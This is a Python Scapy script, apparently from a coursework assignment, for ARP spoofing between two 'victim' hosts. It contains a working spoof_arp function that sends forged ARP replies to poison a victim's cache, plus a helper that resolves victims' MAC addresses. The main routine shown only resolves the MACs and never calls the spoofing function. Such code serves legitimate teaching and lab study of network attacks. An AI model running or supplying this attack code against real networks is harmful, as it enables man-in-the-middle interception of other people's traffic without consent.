import sys
from scapy.all import ARP, Ether, srp, conf
from scapy.all import send
import time


# --- Configuration ---
# It's good practice to define the attacker's interface.
# Based on the assignment, the attacker is on 'eth0'.
ATTACKER_INTERFACE = "eth0"
conf.verb = 0  # Make Scapy less verbose


def spoof_arp(victim_ip, victim_mac, spoof_ip):
    """
    Sends a crafted ARP reply to victim_ip, making them think spoof_ip is at attacker's MAC.
    """
    arp_reply = ARP(
        op=2,                  # ARP reply
        pdst=victim_ip,        # Destination IP (victim)
        hwdst=victim_mac,      # Destination MAC (victim's MAC)
        psrc=spoof_ip          # Source IP (spoofed: "I am this IP")
        # hwsrc is auto-filled as attacker's MAC
    )
    send(arp_reply, iface=ATTACKER_INTERFACE, verbose=False)


def get_mac(ip_address):
    """
    Sends an ARP request to the given IP address and returns its MAC address.
    """
    print(f"[*] Attempting to get MAC address for IP: {ip_address}")
    # Craft an ARP request packet.
    # Ether(dst="ff:ff:ff:ff:ff:ff") specifies the broadcast MAC address for the Ethernet frame.
    # ARP(pdst=ip_address) specifies the target IP address in the ARP payload.
    arp_request_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)

    # srp() sends and receives packets at layer 2.
    # - arp_request_packet: the packet to send.
    # - timeout: how long to wait for a response (in seconds).
    # - iface: the network interface to send the packet from.
    # - verbose: False to suppress Scapy's default output.
    # - conf.verb = 0 (set globally) also helps keep Scapy quiet.
    # srp returns two lists: (answered_packets, unanswered_packets)
    answered_packets, _ = srp(
        arp_request_packet, timeout=2, iface=ATTACKER_INTERFACE, verbose=False)

    if answered_packets:
        # The MAC address is in the 'hwsrc' (hardware source) field of the received ARP packet.
        # answered_packets[0] is the first (and likely only) pair of (sent_packet, received_packet).
        # answered_packets[0][1] is the received_packet.
        # answered_packets[0][1][ARP].hwsrc is the MAC address from the ARP layer of the received packet.
        # Or, more simply, answered_packets[0][1].hwsrc if the received packet is an ARP reply.
        return answered_packets[0][1].hwsrc
    else:
        print(
            f"[!] Could not get MAC address for {ip_address}. Host may be down or unresponsive.")
        return None


def main():
    # Check if the correct number of command line arguments are provided
    if len(sys.argv) != 3:
        print("Error: Incorrect Usage!")
        print("Usage: python3 spoof_arp.py <victim1_ip> <victim2_ip>")
        sys.exit(1)

    # Get the IP addresses of the victims from command line arguments
    victim1_ip = sys.argv[1]
    victim2_ip = sys.argv[2]

    # Print the IP addresses of the victims
    print(f"Victim 1 IP: {victim1_ip}")
    print(f"Victim 2 IP: {victim2_ip}")

    # Get the MAC addresses of the victims
    victim1_mac = get_mac(victim1_ip)
    victim2_mac = get_mac(victim2_ip)

    # Check if the MAC addresses were successfully retrieved
    if not victim1_mac or not victim2_mac:
        print("Error: Failed to get MAC addresses. Exiting...")
        sys.exit(1)

    # Print the MAC addresses of the victims
    print(f"Victim 1 MAC: {victim1_mac}")
    print(f"Victim 2 MAC: {victim2_mac}")


if __name__ == "__main__":
    main()
